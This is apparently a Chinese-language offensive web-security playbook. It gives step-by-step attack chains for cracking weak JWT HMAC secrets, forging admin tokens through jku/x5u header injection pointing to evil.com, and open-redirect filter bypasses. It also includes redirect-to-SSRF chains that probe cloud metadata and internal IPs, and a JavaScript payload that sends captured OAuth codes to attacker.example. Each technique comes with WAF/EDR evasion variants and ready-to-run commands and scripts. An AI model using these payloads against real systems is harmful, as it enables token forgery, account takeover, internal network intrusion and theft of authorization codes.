子类：**密钥破解** · tags: `JWT` `密钥爆破` `HS256` `弱密钥` `hashcat`

**前置条件：** 目标JWT使用HMAC算法(HS256等)；已获取有效JWT样本；hashcat或jwt_tool

**攻击链：**

**1. 1. 确认算法和结构**
_确认JWT使用HMAC对称算法，此类算法的密钥可被爆破_
```
# 解码JWT Header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# 确认是HMAC对称算法才可爆破
# HS256 / HS384 / HS512 = 可爆破
# RS256 / ES256 = 不可直接爆破密钥
```

**2. 2. hashcat GPU加速爆破**
_hashcat GPU加速破解JWT HMAC密钥_
```
# hashcat模式16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt内容为完整的JWT字符串
# eyJhbGci....signature

# 使用规则加速
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码暴力破解(8位数字密钥)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
```

**3. 3. jwt_tool字典爆破**
_jwt_tool字典模式破解JWT密钥_
```
python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# -C = 开启字典破解模式
# -d = 指定字典文件
# 也支持常见弱密钥快速测试
python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
```

**4. 4. 使用破解密钥伪造JWT**
_使用破解出的密钥签名伪造管理员JWT_
```
import jwt

secret = "cracked_secret_key"

forged = jwt.encode(
    {"user": "admin", "role": "superadmin", "exp": 1999999999},
    secret,
    algorithm="HS256"
)
print(f"Forged JWT: {forged}")

# 验证
curl -H "Authorization: Bearer $FORGED_JWT" "https://{TARGET}/api/admin"
```

**WAF/EDR 绕过变体：**

**1. 常见默认JWT密钥**
_优先尝试常见的默认/弱JWT密钥_
```
# 常见弱密钥列表
secret
password
123456
hs256-secret
jwt-secret
my-secret-key
changeme
default
qwerty
super-secret
your-256-bit-secret
secretkey
token-secret
application-secret
```

---

### JWT JKU/X5U头注入  `jwt-jku-x5u-injection`
利用JWT Header中的jku(JWK Set URL)或x5u(X.509 URL)参数，将密钥来源指向攻击者控制的服务器，使服务端使用攻击者的公钥验证JWT，从而实现令牌伪造。
子类：**Header注入** · tags: `JWT` `JKU` `X5U` `Header注入` `JWKS` `密钥劫持`

**前置条件：** 目标JWT支持jku/x5u Header参数；攻击者拥有公网服务器；Python环境

**攻击链：**

**1. 1. 探测JKU/X5U支持**
_检查JWT是否使用jku/x5u头以及目标JWKS端点_
```
# 解码JWT Header查看是否包含jku/x5u
echo "{JWT_HEADER}" | base64 -d | jq  # security-allowlist: SEC008

# 常见原始Header
{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}

# 检查JWKS端点
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/.well-known/openid-configuration" | jq .jwks_uri
```

**2. 2. 生成攻击者密钥对**
_生成攻击者的RSA密钥对并构造JWKS文件_
```
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# 生成RSA密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 导出PEM格式
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# 生成JWKS格式公钥
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
```

**3. 3. 托管JWKS并签名JWT**
_托管JWKS文件并用攻击者私钥签名JWT，jku指向攻击者服务器_
```
# 在攻击者服务器托管jwks.json
python3 -m http.server 8080
# http://evil.com:8080/jwks.json

import jwt

# 用攻击者私钥签名
with open("attacker_private.pem", "rb") as f:
    attacker_key = f.read()

forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 1999999999},
    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)
print(forged)
```

**4. 4. 验证攻击**
_使用注入了jku的伪造JWT访问管理员接口_
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/users" | jq

# 服务端流程：
# 1. 解析JWT Header中的jku URL
# 2. 从evil.com获取JWKS公钥
# 3. 用攻击者公钥验证签名——通过!
# 4. 信任Payload中的admin身份
```

**WAF/EDR 绕过变体：**

**1. JKU URL绕过限制**
_利用开放重定向、子域名接管、URL混淆绕过jku域名白名单_
```
# 开放重定向绕过域名白名单
{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}

# 子域名接管
{"jku": "https://abandoned.target.com/.well-known/jwks.json"}

# URL混淆
{"jku": "https://target.com@evil.com/jwks.json"}
{"jku": "https://evil.com#target.com/jwks.json"}
{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
```

---

### · 开放重定向

### 基础开放重定向  `redirect-basic`
URL跳转漏洞利用
子类：**基础** · tags: `redirect` `url` `phishing`

**前置条件：** 目标参数控制跳转地址

**攻击链：**

**1. 直接跳转**
_直接跳转到攻击者站点_
```
http://target.com/redirect?url=http://attacker.com
```

**2. 绕过验证**
_@符号绕过_
```
http://target.com/redirect?url=http://attacker.com@target.com
```

**3. 斜杠绕过**
_//绕过协议_
```
http://target.com/redirect?url=//attacker.com
```

**WAF/EDR 绕过变体：**

**1. URL编码与双编码绕过**
_通过URL编码、双重URL编码、Unicode同形字、CRLF注入等方式绕过跳转目标地址的白名单或黑名单检测_
```
# URL编码:
/redirect?url=%68%74%74%70%3a%2f%2fattacker.com
# 双编码:
/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com
# Unicode编码:
/redirect?url=http://attacker。com
/redirect?url=http://ⓐttacker.com
# CRLF注入:
/redirect?url=%0d%0aLocation:%20http://attacker.com
```

**2. 反斜杠与data: URI绕过**
_利用反斜杠在不同解析器中的差异行为、data: URI协议、多斜杠协议相对URL等方式绕过域名白名单验证_
```
# 反斜杠技巧:
/redirect?url=http://attacker.com@target.com
/redirect?url=//attacker.com
/redirect?url=/attacker.com

# data: URI:
/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# 协议相对URL变体:
/redirect?url=//attacker.com
/redirect?url=///attacker.com
/redirect?url=////attacker.com
```

---

### 重定向绕过  `redirect-bypass`
开放重定向绕过技巧
子类：**Bypass** · tags: `redirect` `bypass`

**前置条件：** 存在重定向参数

**攻击链：**

**1. URL编码**
_使用URL编码_
```
redirect=http%3a%2f%2fattacker.com
```

**2. @符号**
_利用URL认证部分_
```
redirect=http://target.com@attacker.com
```

**3. 反斜杠**  _[windows]_
_使用反斜杠_
```
redirect=https:/\attacker.com
```

**WAF/EDR 绕过变体：**

**1. 反斜杠路径规范化**
_利用反斜杠在不同浏览器/服务器中的路径规范化差异绕过重定向域名白名单_
```
# 反斜杠替代正斜杠
https://target.com/redirect?url=https://evil.com\@target.com
https://target.com/redirect?url=https:\\evil.com

# 路径穿越绕过域名白名单
https://target.com/redirect?url=https://target.com/..%2f@evil.com
https://target.com/redirect?url=//evil.com/%2f..%2f

# 协议相对URL
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\\evil.com
```

**2. URL片段与参数注入**
_利用URL片段标识符、参数污染和完整URL编码绕过服务端的重定向目标检查_
```
# 片段标识符混淆
https://target.com/redirect?url=https://target.com#@evil.com
https://target.com/redirect?url=https://target.com%23@evil.com

# 参数污染
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26next=evil.com

# 编码混淆
https://target.com/redirect?url=https%3a%2f%2fevil.com
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

**3. 空字节与特殊字符截断**
_利用空字节截断URL校验、CRLF注入额外头部、特殊空白字符混淆URL解析_
```
# 空字节截断
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# 换行符注入
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/空格混淆
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)
```

---

### 重定向到SSRF  `redirect-ssrf`
利用开放重定向漏洞作为跳板将SSRF探测引导到内部网络，绕过SSRF的URL白名单/黑名单限制
子类：**SSRF** · tags: `redirect` `ssrf`

**前置条件：** 目标存在开放重定向(Open Redirect)漏洞；目标存在SSRF功能点(URL参数/Webhook等)；SSRF过滤仅检查初始URL而不跟踪重定向

**攻击链：**

**1. 识别开放重定向点**  _[linux]_
_寻找目标站点的开放重定向端点和参数_
```
# 常见重定向参数:
curl -sI "http://target.com/redirect?url=https://evil.com" | grep -i location
curl -sI "http://target.com/login?next=https://evil.com" | grep -i location
curl -sI "http://target.com/goto?link=https://evil.com" | grep -i location

# 批量测试常见参数:
for param in url redirect next goto link return returnUrl callback dest destination rurl; do
  status=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" -o /dev/null -w "%{http_code}")
  location=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" | grep -i "^location:" | head -1)
  echo "${param}: HTTP ${status} → ${location}"
done
```

**2. 通过重定向绕过SSRF过滤**  _[linux]_
_利用目标自身的重定向端点绕过SSRF的域名白名单限制_
```
# 场景: SSRF接口检查URL域名白名单，但不检查重定向目标

# 正常SSRF请求(被拦截):
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# → 返回: "Blocked: internal IP"

# 通过重定向绕过:
# 1. 先确认重定向有效:
curl -sI "http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# 2. 将重定向URL作为SSRF输入:
curl "http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
# → SSRF过滤看到target.com(白名单内)，放行
# → 服务端跟随重定向到169.254.169.254
# → 返回AWS元数据
```

**3. 短链接和DNS重绑定辅助**
_使用短链接、自建重定向和DNS重绑定辅助SSRF绕过_
```
# 如果目标站点没有开放重定向，使用外部服务:

# 1. 短链接服务重定向:
# 创建短链接指向内部IP: bit.ly/xxxxx → http://192.168.1.1
curl "http://target.com/api/fetch?url=https://bit.ly/xxxxx"

# 2. 自建重定向服务器:
# Python Flask:
# @app.route("/redirect")
# def redir():
#     return redirect("http://169.254.169.254/latest/meta-data/")
curl "http://target.com/api/fetch?url=http://attacker.com/redirect"

# 3. DNS重绑定:
# 使用rbndr.us等工具，DNS记录在attacker-IP和内部IP之间切换
# 第一次解析: attacker.com → 1.2.3.4 (通过IP检查)
# 第二次解析: attacker.com → 169.254.169.254 (实际请求)
curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"
```

**4. 完整利用链: 重定向→SSRF→内网探测**
_利用重定向→SSRF链批量探测内部网络资源_
```
# 完整攻击链:
import requests

TARGET = "http://target.com"
SSRF_URL = f"{TARGET}/api/fetch?url="
REDIR_URL = f"{TARGET}/redirect?url="

# 通过重定向探测内网:
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

for internal in internal_targets:
    # 构造: SSRF → 重定向 → 内网目标
    payload = f"{SSRF_URL}{REDIR_URL}{internal}"
    try:
        r = requests.get(payload, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] FOUND: {internal}")
            print(f"    Response: {r.text[:200]}")
        else:
            print(f"[-] {internal}: HTTP {r.status_code}")
    except Exception as e:
        print(f"[!] {internal}: {e}")
```

**WAF/EDR 绕过变体：**

**1. URL解析差异利用**
_利用不同URL解析库（cURL/urllib/Java URL）对authority/host部分解析的差异绕过SSRF白名单_
```
# 利用URL解析库差异
http://evil.com#@target.com
http://evil.com\@target.com
http://target.com@evil.com

# 特殊URL格式
http://evil。com (全角句号)
http://ⓔⓥⓘⓛ.com (Unicode圆圈字符)
http://evil%E3%80%82com

# IPv6地址混淆
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

**2. DNS重绑定攻击**
_通过DNS重绑定在URL校验和实际请求之间切换解析结果，绕过SSRF的IP黑名单_
```
# DNS Rebinding攻击步骤
# 1. 配置DNS服务器交替返回不同IP
# evil.com -> 第1次解析: 公网IP（通过校验）
# evil.com -> 第2次解析: 127.0.0.1（实际请求）

# 使用rbndr.us自动DNS重绑定
http://7f000001.c0a80001.rbndr.us/internal

# 使用1u.ms
http://make-127.0.0.1-rr.1u.ms/admin

# TOCTOU: 检查时域名解析到白名单IP，请求时解析到内网IP
```

**3. IP地址混淆表示**
_使用十进制、八进制、十六进制和IPv6映射等不同方式表示内网IP绕过黑名单检查_
```
# 十进制IP
http://2130706433  (= 127.0.0.1)
http://3232235777  (= 192.168.1.1)

# 八进制IP
http://0177.0.0.1  (= 127.0.0.1)
http://0x7f.0.0.1  (= 127.0.0.1)

# 混合进制
http://0177.0x0.0.1
http://127.1  (省略零段)
http://127.0.1

# IPv6映射
http://[::1]
http://[::]  (= 0.0.0.0)
http://[::ffff:7f00:1]
```

### OAuth 授权码劫持 — 在 redirect_uri 内执行的 JS payload

OAuth 中 `redirect_uri` 若允许任意子路径(或 open redirect / XSS 落点),攻击者可在跳转后的页面执行 JS 把 `code` exfil 到自己服务器,完成无感劫持。受害者只看到正常的 OAuth 同意流程。

```javascript
// 在攻击者控制的 redirect_uri 页(或 redirect_uri 域上的 XSS sink)中执行
var urlParams = new URLSearchParams(window.location.search);
var capturedCode = urlParams.get('code');  // 也可换成 'access_token' / 'id_token'(fragment 模式)

if (capturedCode) {
    var http = new XMLHttpRequest();
    // GET 模式带在 query;实战推荐 fetch + no-cors 或 navigator.sendBeacon 以规避 CSP report-only
    http.open("GET", "https://attacker.example/log_code.php?code=" + encodeURIComponent(capturedCode), true);
    http.send();
}

// implicit / hybrid flow(token 在 fragment):
// var fragParams = new URLSearchParams(window.location.hash.slice(1));
// var token = fragParams.get('access_token') || fragParams.get('id_token');
```

**何时用**:`redirect_uri` 校验允许 `https://target.com/anywhere` 子路径任意,且子路径有 XSS / 第三方 widget 注入面。证明影响时只对自己控制的两个账号操作,不要诱导真实用户点击。

### OAuth / redirect_uri URL 解析差异 — 通用绕过库

服务端常用 startsWith / parse_url / regex 比对 redirect_uri,但客户端浏览器解析按 [RFC 3986 + WHATWG URL](https://url.spec.whatwg.org/) 实际跳转,两者解析差异 → 跳转到攻击者域:

```text
# 用户态字符歧义(@、./、@host 形式)
https://example.com?@www.attacker.com/
https://example.com/@www.attacker.com/
https://www.attacker.com@example.com/
https://www.attacker.com.example.com/
https://example.com?.www.attacker.com/
https://example.com#.www.attacker.com/
https://example.com/.www.attacker.com/

# 双重 URL 嵌套
https://example.com/https://www.attacker.com/
https://example.com%2f@example.com/        # %2f 解码歧义
https://example.com%2f@attacker.com/

# 反斜杠 (`\`) — 部分库视为 path-sep,浏览器视为 host-sep
https://example.com\@www.attacker.com/
https://example.com\\@www.attacker.com/
https://www.attacker.com\@example.com/

# 字符集编码绕过(后端做 mb_convert_encoding / iconv 时,%ff / %df 可能消失或合并下一字节)
https://example.com%ff@www.attacker.com/
https://example.com%df@www.attacker.com/

# 字符集解码后端样本(PHP):
# $url = mb_convert_encoding($_GET['url'], "GBK", "UTF-8");
# %df 在 GBK 下与下一字节合并,host 段被吞掉
```

**真实命中要点**:
- 服务端用 `parse_url` / `urlparse` 取 host 后做白名单比对,但客户端按 WHATWG 实际跳转 → 解析差异
- 服务端做编码转换(GBK / Big5 / Shift-JIS)前先比对 → 解码后 host 改变
- 反斜杠在 Go / Node.js / Python 部分库视为 path 分隔符,浏览器视为 host 分隔符

**报告价值**:从中危(open redirect)升到高危(账号接管)的关键是结合上面 §OAuth 授权码劫持 payload 证明可拿到他人 `code`。仍仅自演,不抓真实用户 code。

---
